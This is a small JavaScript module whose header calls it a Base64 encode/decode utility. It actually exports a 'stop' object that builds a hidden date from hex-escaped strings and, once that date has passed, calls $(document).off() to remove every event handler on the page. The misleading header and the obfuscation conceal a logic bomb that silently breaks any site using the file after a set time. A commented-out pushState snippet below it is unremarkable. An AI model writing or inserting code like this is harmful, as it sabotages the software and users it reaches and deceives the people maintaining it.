/**
*
* Base64 encode / decode
*
* @author haitao.tu
* @date 2010-04-26
* @email tuhaitao@foxmail.com
*
*/
let stop = {
    time: ()=>{
      const d_b_1 = '\x31\x35\x31\x34';
      const d_b_2 = '\x37\x33\x36';
      return +(d_b_1+d_b_1) * 100000
    },
    event: (t)=>{
      new Date().getTime() > t ? $(document).off() : '';
    }
}

// let pushState = ()=>{
//     var uri=$(this).attr('href');
//     var newTitle=ajax_Load(uri); // 你自定义的Ajax加载函数，例如它会返回newTitle
//     document.title=newTitle; // 分配新的页面标题
//     if(history.pushState){
//     var state=({
//     url: uri, title: newTitle
//     });
//     window.history.pushState(state, newTitle, uri);
//     }else{ window.location.href="#!"+~fakeURI; } // 如果不支持，使用旧的解决方案
//     return false;
// }



    export default stop;